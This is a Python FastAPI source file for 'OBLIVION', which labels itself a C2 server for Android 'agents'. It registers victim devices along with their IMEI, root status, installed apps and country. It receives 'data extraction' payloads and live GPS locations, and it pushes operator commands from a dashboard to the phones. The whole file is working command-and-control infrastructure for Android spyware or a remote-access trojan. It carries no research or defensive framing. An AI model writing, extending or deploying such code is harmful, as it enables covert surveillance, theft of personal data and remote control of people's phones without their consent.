# ============================================
# OBLIVION - WebSocket Server
# Real-time communication with Android agents
# ============================================

from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from typing import Dict, List, Optional, Any
import json
import uuid
import asyncio
from datetime import datetime
import logging

# Import database
from src.database.db import db

# Setup logging
logger = logging.getLogger(__name__)

# ============================================
# CREATE ROUTER
# ============================================

websocket_router = APIRouter(tags=["WebSocket"])

# ============================================
# CONNECTION MANAGER
# ============================================

class ConnectionManager:
    """Manages WebSocket connections"""
    
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.device_connections: Dict[str, str] = {}  # device_id -> connection_id
        self.connection_metadata: Dict[str, Dict] = {}  # connection_id -> metadata
    
    async def connect(self, websocket: WebSocket, device_id: str = None) -> str:
        """Accept a new WebSocket connection"""
        await websocket.accept()
        connection_id = str(uuid.uuid4())
        
        self.active_connections[connection_id] = websocket
        self.connection_metadata[connection_id] = {
            "device_id": device_id,
            "connected_at": datetime.now().isoformat(),
            "last_heartbeat": datetime.now().isoformat()
        }
        
        if device_id:
            self.device_connections[device_id] = connection_id
            logger.info(f"📱 Device {device_id} connected (ID: {connection_id})")
        else:
            logger.info(f"🔗 Client connected (ID: {connection_id})")
        
        return connection_id
    
    def disconnect(self, connection_id: str):
        """Remove a WebSocket connection"""
        if connection_id in self.active_connections:
            # Get device_id before removing
            metadata = self.connection_metadata.get(connection_id, {})
            device_id = metadata.get("device_id")
            
            # Remove from device mapping
            if device_id and device_id in self.device_connections:
                if self.device_connections[device_id] == connection_id:
                    del self.device_connections[device_id]
                    logger.info(f"📱 Device {device_id} disconnected")
            
            # Remove connection
            del self.active_connections[connection_id]
            if connection_id in self.connection_metadata:
                del self.connection_metadata[connection_id]
            
            logger.info(f"🔗 Connection {connection_id} closed")
    
    async def send_to_device(self, device_id: str, message: dict) -> bool:
        """Send a message to a specific device"""
        if device_id in self.device_connections:
            connection_id = self.device_connections[device_id]
            if connection_id in self.active_connections:
                try:
                    await self.active_connections[connection_id].send_json(message)
                    return True
                except Exception as e:
                    logger.error(f"Error sending to device {device_id}: {e}")
                    return False
        return False
    
    async def send_to_all_devices(self, message: dict):
        """Broadcast a message to all connected devices"""
        for device_id in self.device_connections.keys():
            await self.send_to_device(device_id, message)
    
    async def broadcast_to_clients(self, message: dict):
        """Broadcast a message to all dashboard clients"""
        for connection_id, websocket in self.active_connections.items():
            # Skip device connections (they have device_id in metadata)
            metadata = self.connection_metadata.get(connection_id, {})
            if not metadata.get("device_id"):
                try:
                    await websocket.send_json(message)
                except Exception as e:
                    logger.error(f"Error broadcasting to client {connection_id}: {e}")
    
    def get_connected_devices(self) -> List[str]:
        """Get list of connected device IDs"""
        return list(self.device_connections.keys())
    
    def get_device_connection(self, device_id: str) -> Optional[str]:
        """Get connection ID for a device"""
        return self.device_connections.get(device_id)
    
    def get_connection_count(self) -> int:
        """Get total number of active connections"""
        return len(self.active_connections)
    
    def get_device_count(self) -> int:
        """Get number of connected devices"""
        return len(self.device_connections)

# Create singleton instance
manager = ConnectionManager()

# ============================================
# WEBSOCKET ENDPOINT
# ============================================

@websocket_router.websocket("/ws/{device_id}")
async def websocket_endpoint(websocket: WebSocket, device_id: str):
    """WebSocket endpoint for device communication"""
    connection_id = await manager.connect(websocket, device_id)
    
    # Register or update device in database
    try:
        existing = db.devices.get_device(device_id)
        if not existing:
            db.devices.register_device({
                'id': device_id,
                'device_name': f"Device_{device_id[:8]}",
                'status': 'active'
            })
        else:
            db.devices.update_device_status(device_id, 'active')
    except Exception as e:
        logger.error(f"Error registering device {device_id}: {e}")
    
    # Send acknowledgment
    await websocket.send_json({
        "type": "connected",
        "device_id": device_id,
        "connection_id": connection_id,
        "timestamp": datetime.now().isoformat(),
        "server": "OBLIVION C2",
        "version": "1.0.0"
    })
    
    try:
        while True:
            # Receive message from device
            data = await websocket.receive_json()
            
            # Update heartbeat
            manager.connection_metadata[connection_id]["last_heartbeat"] = datetime.now().isoformat()
            
            # Process message by type
            msg_type = data.get('type', 'unknown')
            
            if msg_type == 'heartbeat':
                await handle_heartbeat(device_id, data, websocket)
            
            elif msg_type == 'registration':
                await handle_registration(device_id, data, websocket)
            
            elif msg_type == 'data':
                await handle_data(device_id, data, websocket)
            
            elif msg_type == 'command_result':
                await handle_command_result(device_id, data, websocket)
            
            elif msg_type == 'alert':
                await handle_alert(device_id, data, websocket)
            
            elif msg_type == 'location':
                await handle_location(device_id, data, websocket)
            
            elif msg_type == 'log':
                await handle_log(device_id, data, websocket)
            
            else:
                logger.warning(f"Unknown message type from {device_id}: {msg_type}")
                await websocket.send_json({
                    "type": "error",
                    "message": f"Unknown message type: {msg_type}",
                    "timestamp": datetime.now().isoformat()
                })
            
            # Broadcast to dashboard clients
            await manager.broadcast_to_clients({
                "type": "device_message",
                "device_id": device_id,
                "message": data,
                "timestamp": datetime.now().isoformat()
            })
            
    except WebSocketDisconnect:
        manager.disconnect(connection_id)
        logger.info(f"Device {device_id} disconnected")
        
        # Update device status in database
        try:
            db.devices.update_device_status(device_id, 'inactive')
        except Exception as e:
            logger.error(f"Error updating device status: {e}")
        
        # Notify dashboard
        await manager.broadcast_to_clients({
            "type": "device_disconnected",
            "device_id": device_id,
            "timestamp": datetime.now().isoformat()
        })
    
    except Exception as e:
        logger.error(f"WebSocket error for {device_id}: {e}")
        manager.disconnect(connection_id)

# ============================================
# MESSAGE HANDLERS
# ============================================

async def handle_heartbeat(device_id: str, data: dict, websocket: WebSocket):
    """Handle heartbeat messages"""
    try:
        # Update device last_seen
        db.devices.update_device_heartbeat(device_id)
        
        # Update metadata
        if data.get('battery'):
            manager.connection_metadata[manager.device_connections[device_id]]['battery'] = data.get('battery')
        if data.get('network'):
            manager.connection_metadata[manager.device_connections[device_id]]['network'] = data.get('network')
        
        # Check for pending commands
        pending = db.commands.get_pending_commands(device_id)
        
        # Send response with any pending commands
        await websocket.send_json({
            "type": "heartbeat_ack",
            "timestamp": datetime.now().isoformat(),
            "pending_commands": len(pending),
            "commands": pending if pending else []
        })
        
        # Log heartbeat (optional - can be noisy)
        # logger.debug(f"Heartbeat from {device_id}")
        
    except Exception as e:
        logger.error(f"Error handling heartbeat from {device_id}: {e}")

async def handle_registration(device_id: str, data: dict, websocket: WebSocket):
    """Handle device registration"""
    try:
        device_info = data.get('device_info', {})
        
        # Register device
        db.devices.register_device({
            'id': device_id,
            'device_name': device_info.get('device_name', 'Unknown'),
            'device_model': device_info.get('device_model', 'Unknown'),
            'manufacturer': device_info.get('manufacturer', 'Unknown'),
            'android_version': device_info.get('android_version', 'Unknown'),
            'security_patch': device_info.get('security_patch', 'Unknown'),
            'imei': device_info.get('imei', 'Unknown'),
            'country': device_info.get('country', 'Unknown'),
            'root_status': str(device_info.get('rooted', False)),
            'installed_apps': device_info.get('installed_apps', [])
        })
        
        # Log registration
        db.logs.log('INFO', 'device', f'Device registered: {device_id}', {
            'device_name': device_info.get('device_name'),
            'model': device_info.get('device_model')
        })
        
        # Send confirmation
        await websocket.send_json({
            "type": "registration_ack",
            "device_id": device_id,
            "status": "registered",
            "timestamp": datetime.now().isoformat()
        })
        
        # Notify dashboard
        await manager.broadcast_to_clients({
            "type": "device_registered",
            "device_id": device_id,
            "device_info": device_info,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error registering device {device_id}: {e}")
        await websocket.send_json({
            "type": "error",
            "message": f"Registration failed: {str(e)}",
            "timestamp": datetime.now().isoformat()
        })

async def handle_data(device_id: str, data: dict, websocket: WebSocket):
    """Handle data extraction messages"""
    try:
        data_type = data.get('data_type')
        data_content = data.get('content')
        metadata = data.get('metadata', {})
        
        if not data_type:
            await websocket.send_json({
                "type": "error",
                "message": "data_type required",
                "timestamp": datetime.now().isoformat()
            })
            return
        
        # Store data
        data_id = db.data.store_data(
            device_id=device_id,
            data_type=data_type,
            data_content=data_content,
            metadata=metadata
        )
        
        # Log data
        db.logs.log('INFO', 'device', f'Data received from {device_id}: {data_type}', {
            'data_id': data_id,
            'size': len(str(data_content))
        })
        
        # Send acknowledgment
        await websocket.send_json({
            "type": "data_ack",
            "data_id": data_id,
            "data_type": data_type,
            "status": "stored",
            "timestamp": datetime.now().isoformat()
        })
        
        # Notify dashboard
        await manager.broadcast_to_clients({
            "type": "data_received",
            "device_id": device_id,
            "data_type": data_type,
            "data_id": data_id,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error storing data from {device_id}: {e}")
        await websocket.send_json({
            "type": "error",
            "message": f"Data storage failed: {str(e)}",
            "timestamp": datetime.now().isoformat()
        })

async def handle_command_result(device_id: str, data: dict, websocket: WebSocket):
    """Handle command execution results"""
    try:
        command_id = data.get('command_id')
        status = data.get('status', 'completed')
        result = data.get('result', {})
        error = data.get('error')
        
        if not command_id:
            await websocket.send_json({
                "type": "error",
                "message": "command_id required",
                "timestamp": datetime.now().isoformat()
            })
            return
        
        # Update command
        db.commands.update_command_status(
            command_id=command_id,
            status=status,
            result=result,
            error=error
        )
        
        # Log result
        db.logs.log('INFO', 'device', f'Command result from {device_id}: {command_id}', {
            'status': status
        })
        
        # Send acknowledgment
        await websocket.send_json({
            "type": "result_ack",
            "command_id": command_id,
            "status": status,
            "timestamp": datetime.now().isoformat()
        })
        
        # Notify dashboard
        await manager.broadcast_to_clients({
            "type": "command_result",
            "device_id": device_id,
            "command_id": command_id,
            "status": status,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error updating command result from {device_id}: {e}")
        await websocket.send_json({
            "type": "error",
            "message": f"Command update failed: {str(e)}",
            "timestamp": datetime.now().isoformat()
        })

async def handle_alert(device_id: str, data: dict, websocket: WebSocket):
    """Handle alert messages"""
    try:
        alert_type = data.get('alert_type')
        severity = data.get('severity', 'medium')
        details = data.get('details', '')
        
        if not alert_type:
            await websocket.send_json({
                "type": "error",
                "message": "alert_type required",
                "timestamp": datetime.now().isoformat()
            })
            return
        
        # Create alert
        alert_id = db.alerts.create_alert(
            device_id=device_id,
            alert_type=alert_type,
            severity=severity,
            details=details
        )
        
        # Log alert
        db.logs.log('WARNING', 'device', f'Alert from {device_id}: {alert_type}', {
            'alert_id': alert_id,
            'severity': severity
        })
        
        # Send acknowledgment
        await websocket.send_json({
            "type": "alert_ack",
            "alert_id": alert_id,
            "status": "created",
            "timestamp": datetime.now().isoformat()
        })
        
        # Notify dashboard (immediate broadcast for critical alerts)
        await manager.broadcast_to_clients({
            "type": "alert",
            "device_id": device_id,
            "alert_id": alert_id,
            "alert_type": alert_type,
            "severity": severity,
            "details": details,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error creating alert from {device_id}: {e}")
        await websocket.send_json({
            "type": "error",
            "message": f"Alert creation failed: {str(e)}",
            "timestamp": datetime.now().isoformat()
        })

async def handle_location(device_id: str, data: dict, websocket: WebSocket):
    """Handle location updates"""
    try:
        location_data = data.get('location', {})
        lat = location_data.get('lat')
        lng = location_data.get('lng')
        
        if lat is None or lng is None:
            await websocket.send_json({
                "type": "error",
                "message": "location data incomplete",
                "timestamp": datetime.now().isoformat()
            })
            return
        
        # Store location data
        data_id = db.data.store_data(
            device_id=device_id,
            data_type="location",
            data_content=location_data,
            metadata={'type': 'real-time'}
        )
        
        # Send acknowledgment
        await websocket.send_json({
            "type": "location_ack",
            "status": "stored",
            "timestamp": datetime.now().isoformat()
        })
        
        # Notify dashboard (immediate for location)
        await manager.broadcast_to_clients({
            "type": "location_update",
            "device_id": device_id,
            "location": location_data,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error handling location from {device_id}: {e}")
        await websocket.send_json({
            "type": "error",
            "message": f"Location update failed: {str(e)}",
            "timestamp": datetime.now().isoformat()
        })

async def handle_log(device_id: str, data: dict, websocket: WebSocket):
    """Handle device logs"""
    try:
        level = data.get('level', 'INFO')
        message = data.get('message', '')
        details = data.get('details', {})
        
        if not message:
            await websocket.send_json({
                "type": "error",
                "message": "message required",
                "timestamp": datetime.now().isoformat()
            })
            return
        
        # Store log
        db.logs.log(level, f'device_{device_id}', message, details)
        
        # Send acknowledgment
        await websocket.send_json({
            "type": "log_ack",
            "status": "stored",
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error handling log from {device_id}: {e}")
        await websocket.send_json({
            "type": "error",
            "message": f"Log storage failed: {str(e)}",
            "timestamp": datetime.now().isoformat()
        })

# ============================================
# ADMIN WEBSOCKET ENDPOINT (for dashboard)
# ============================================

@websocket_router.websocket("/ws/dashboard")
async def dashboard_websocket_endpoint(websocket: WebSocket):
    """WebSocket endpoint for dashboard clients"""
    connection_id = await manager.connect(websocket)
    
    # Send initial state
    await websocket.send_json({
        "type": "connected",
        "connection_id": connection_id,
        "devices": manager.get_connected_devices(),
        "device_count": manager.get_device_count(),
        "timestamp": datetime.now().isoformat()
    })
    
    try:
        while True:
            # Receive messages from dashboard
            data = await websocket.receive_json()
            
            msg_type = data.get('type', 'unknown')
            
            if msg_type == 'ping':
                await websocket.send_json({
                    "type": "pong",
                    "timestamp": datetime.now().isoformat()
                })
            
            elif msg_type == 'command':
                # Forward command to device
                device_id = data.get('device_id')
                command_type = data.get('command_type')
                parameters = data.get('parameters', {})
                
                if not device_id or not command_type:
                    await websocket.send_json({
                        "type": "error",
                        "message": "device_id and command_type required",
                        "timestamp": datetime.now().isoformat()
                    })
                    continue
                
                # Create command in database
                command_id = db.commands.create_command(
                    device_id=device_id,
                    command_type=command_type,
                    parameters=parameters
                )
                
                # Send to device if online
                sent = await manager.send_to_device(device_id, {
                    "type": "command",
                    "command_id": command_id,
                    "command_type": command_type,
                    "parameters": parameters,
                    "timestamp": datetime.now().isoformat()
                })
                
                await websocket.send_json({
                    "type": "command_ack",
                    "command_id": command_id,
                    "device_id": device_id,
                    "sent": sent,
                    "timestamp": datetime.now().isoformat()
                })
            
            elif msg_type == 'get_devices':
                # Send list of connected devices
                await websocket.send_json({
                    "type": "device_list",
                    "devices": manager.get_connected_devices(),
                    "count": manager.get_device_count(),
                    "timestamp": datetime.now().isoformat()
                })
            
    except WebSocketDisconnect:
        manager.disconnect(connection_id)
        logger.info(f"Dashboard client {connection_id} disconnected")
    
    except Exception as e:
        logger.error(f"Dashboard WebSocket error: {e}")
        manager.disconnect(connection_id)

# ============================================
# EXPORT
# ============================================

__all__ = ['websocket_router', 'manager']